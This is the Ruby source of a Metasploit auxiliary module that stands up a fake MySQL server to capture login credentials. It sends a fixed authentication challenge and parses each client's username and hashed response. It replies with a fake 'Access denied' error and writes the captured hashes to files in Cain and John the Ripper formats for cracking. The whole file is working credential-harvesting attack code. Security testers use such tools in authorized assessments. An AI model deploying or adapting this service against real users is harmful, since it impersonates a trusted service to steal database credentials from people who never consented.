##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Authentication Capture: MySQL',
      'Description' => %q{
        This module provides a fake MySQL service that is designed to
        capture authentication credentials. It captures	challenge and
        response pairs that can be supplied to Cain or JtR for cracking.
      },
      'Author' => 'Patrik Karlsson <patrik[at]cqure.net>',
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Capture', { 'Description' => 'Run MySQL capture server' } ]],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction' => 'Capture'
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 3306 ]),
        OptString.new('CHALLENGE', [ true, 'The 16 byte challenge', '112233445566778899AABBCCDDEEFF1122334455' ]),
        OptString.new('SRVVERSION', [ true, 'The server version to report in the greeting response', '5.5.16' ]),
        OptString.new('CAINPWFILE', [ false, 'The local filename to store the hashes in Cain&Abel format', nil ]),
        OptString.new('JOHNPWFILE', [ false, 'The prefix to the local filename to store the hashes in JOHN format', nil ]),
      ]
    )
  end

  def setup
    super
    @state = {}
  end

  def run
    if datastore['CHALLENGE'].to_s =~ /^([a-fA-F1-9]{40})$/
      @challenge = [ datastore['CHALLENGE'] ].pack('H*')
    else
      print_error('CHALLENGE syntax must match 112233445566778899AABBCCDDEEFF1122334455')
      return
    end
    @version = datastore['SRVVERSION']
    exploit
  end

  def on_client_connect(client)
    @state[client] = {
      name: "#{client.peerhost}:#{client.peerport}",
      ip: client.peerhost,
      port: client.peerport
    }
    mysql_send_greeting(client)
  end

  def mysql_send_greeting(client)
    # https://dev.mysql.com/doc/internals/en/connection-phase-packets.html

    length = 68 + @version.length
    packetno = 0
    chall = String.new(@challenge)
    data = [
      (length & 0x00FFFFFF) + (packetno << 24), # length + packet no
      10, # protocol version: 10e
      @version, # server version: 5.5.16 (unless changed)
      rand(1..9999), # thread id
      chall.slice!(0, 8), # the first 8 bytes of the challenge
      0x00, # filler
      0xfff7, # server capabilities
      0x21, # server language: UTF8
      0x0002, # server status
      '0f801500000000000000000000', # filler
      chall.slice!(0, 12),
      'mysql_native_password'
    ].pack('VCZ*VA*CnCvH*Z*Z*')
    client.put data
  end

  def mysql_process_login(data, info)
    (data.slice(0, 4).unpack('V')[0] & 0x00FFFFFF)
    (data.slice!(0, 4).unpack('V')[0] & 0xFF000000) >> 24
    flags = data.slice!(0, 2).unpack('v')[0]
    if (flags & 0x8000) != 0x8000
      info[:errors] << 'Unsupported protocol detected'
      return info
    end

    # we're dealing with the 4.1+ protocol
    data.slice!(0, 2).unpack('v')[0]
    data.slice!(0, 4).unpack('N')[0]
    data.slice!(0, 1).unpack('C')[0]

    # slice away 23 bytes of filler
    data.slice!(0, 23)

    info[:username] = data.slice!(0, data.index("\x00") + 1).unpack('Z*')[0]
    response_len = data.slice!(0, 1).unpack('C')[0]
    if response_len != 20
      return
    end

    info[:response] = data.slice!(0, 20).unpack('A*')[0]

    if (flags & 0x0008) == 0x0008
      info[:database] = data.slice!(0, data.index("\x00")).unpack('A*')[0]
    end
    info
  end

  def mysql_send_error(client, msg)
    length = 9 + msg.length
    packetno = 2
    data = [
      (length & 0x00FFFFFF) + (packetno << 24), # length + packet no
      0xFF, # field count, always: ff
      1045, # error code
      0x23, # sqlstate marker, always '#'
      '28000', # sqlstate
      msg
    ].pack('VCvCA*A*')
    client.put data
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :nonreplayable_hash
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_data(client)
    info = { errors: [] }
    data = client.get_once
    return if !data

    mysql_process_login(data, info)
    if info[:errors] && !info[:errors].empty?
      print_error("#{@state[client][:name]} #{info[:errors].join("\n")}")
    elsif info[:username] && info[:response]
      mysql_send_error(client, "Access denied for user '#{info[:username]}'@'#{client.peerhost}' (using password: YES)")
      if info[:database]
        print_good("#{@state[client][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}; Database: #{info[:database]}")
      else
        print_good("#{@state[client][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}")
      end
      hash_line = "#{info[:username]}:$mysql$#{@challenge.unpack('H*')[0]}$#{info[:response].unpack('H*')[0]}"

      report_cred(
        ip: client.peerhost,
        port: datastore['SRVPORT'],
        service_name: 'mysql_client',
        user: info[:username],
        password: hash_line,
        proof: info[:database] || hash_line
      )

      if datastore['CAINPWFILE']
        fd = ::File.open(datastore['CAINPWFILE'], 'ab')
        fd.puts(
          [
            info[:username],
            'NULL',
            info[:response].unpack('H*')[0],
            @challenge.unpack('H*')[0],
            'SHA1'
          ].join("\t").gsub(/\n/, '\\n')
        )
        fd.close
      end

      if datastore['JOHNPWFILE']
        john_hash_line = "#{info[:username]}:$mysqlna$#{@challenge.unpack('H*')[0]}*#{info[:response].unpack('H*')[0]}"
        fd = ::File.open(datastore['JOHNPWFILE'] + '_mysqlna', 'ab')
        fd.puts john_hash_line
        fd.close
      end
    else
      mysql_send_error(client, "Access denied for user '#{info[:username]}'@'#{client.peerhost}' (using password: NO)")
    end
    client.close
  end

  def on_client_close(client)
    @state.delete(client)
  end
end
